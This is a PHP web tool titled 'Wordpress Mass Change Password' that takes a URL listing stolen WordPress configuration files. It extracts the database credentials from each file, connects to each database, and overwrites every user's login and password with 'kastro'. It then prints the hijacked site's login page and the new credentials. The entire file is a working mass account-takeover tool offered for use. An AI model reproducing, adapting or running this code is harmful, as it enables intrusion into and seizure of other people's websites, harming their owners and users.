<html>
<head>
	<title>Wordpress Mass Change Password</title>
	<link href="http://www.iconarchive.com/download/i43809/itzikgur/my-seven/Security.ico" rel="icon">
	<style type="text/css">
	
	@import 'https://fonts.googleapis.com/css?family=Oswald';
html,body{
	background: #f9f9f9;
	padding: 0;
	direction: ltr;
	margin: 0;
}
h1{
	color:#16a085;
	text-shadow:0 0 5px;
	font-family: 'Oswald', sans-serif;
}
#gter{
	position: absolute;
	top: 0;
	width: 100%;
	text-align: center;
	background: #16a085;
	color:#fff;
	padding-top: 10px;
	padding-bottom: 10px;
	font-family: 'Oswald', sans-serif;
	border-top: 5px solid #2980b9;
	border-bottom: 5px solid #2c3e50;
	margin-bottom:20px;
}
.f{
	color:#666;
	text-shadow: 0 0 5px #00ff00;
	font-size: 20px;
}
a{
	text-decoration: none;
	color:#ff0000;
	text-shadow:0 0 5px;
}
form{
	margin-top: 120px;
}
input[type=submit]{
	padding: 10px;
	border:1px solid #ccc;
	background: #f9f9f9;
	border-radius: 5px;
	cursor: pointer;
	color:#000;
	transition: all 0.2s;
	font-family: 'Oswald', sans-serif;
}
input[type=submit]:hover{
	box-shadow: 0 0 2px #ff0000;
}
input[type=text]{
	font-family: 'Oswald', sans-serif;
	color:#000;	
	border:1px solid #ccc;
	background: #f9f9f9;
	padding: 10px;
	width: 400px;
	transition: all 0.5s;
}	
input[type=text]:focus{
	box-shadow: 0 0 3px #ff0000;
}
	
	
	</style>
</head>
<body>
<center>
<div id="gter">Coded By Dr.Injection</div>
<form method="post">
<input type="text" name="config" placeholder="URL">
<input type="submit" name="ch" value="Change">
</form>
</center>
<?
set_time_limit(0);
error_reporting(0);
if($_POST['ch']){
$get2 = file_get_contents($_POST['config']);
preg_match_all('#<a href="(.*?)"#', $get2, $config);
foreach($config[1] as $don){
$get = file_get_contents($_POST['config']."/".$don);

preg_match_all("#'DB_HOST', '(.*?)'#", $get, $host);
foreach($host[1] as $don){
	$host = $don;
}
###
preg_match_all("#'DB_PASSWORD', '(.*?)'#", $get, $pass);
foreach($pass[1] as $done){
	$password = $done;
}
###
preg_match_all("#'DB_USER', '(.*?)'#", $get, $user);
foreach($user[1] as $done1){
	$user = $done1;
}
###
preg_match_all("#'DB_NAME', '(.*?)'#", $get, $name);
foreach($name[1] as $done2){
	$name = $done2;
}
###
preg_match_all("#$table_prefix  = '(.*?)'#", $get, $prefix);
foreach($prefix[1] as $done3){
	$prefix = $done3;
}
$connect = mysqli_connect($host,$user,$password,$name);
if($connect){
	$query1 = mysqli_query($connect,"select * from ".$prefix."options where option_name='siteurl'");
while($siteurl = mysqli_fetch_array($query1)){
	$site_url = $siteurl['option_value'];
}
#####
$query2 = mysqli_query($connect,"update ".$prefix."users set user_login='kastro',user_pass='26afd83df6d006d38bb1b7470ebdc63a'");
if($query2){
	echo "<center><span class=f>URL : <a href='$site_url/wp-login.php' target='_blank'>$site_url</a><br><br>UserName : kastro<br><br>Password : kastro<br><br></span></center>";
}
}
}
}
?>
</body>
</html>
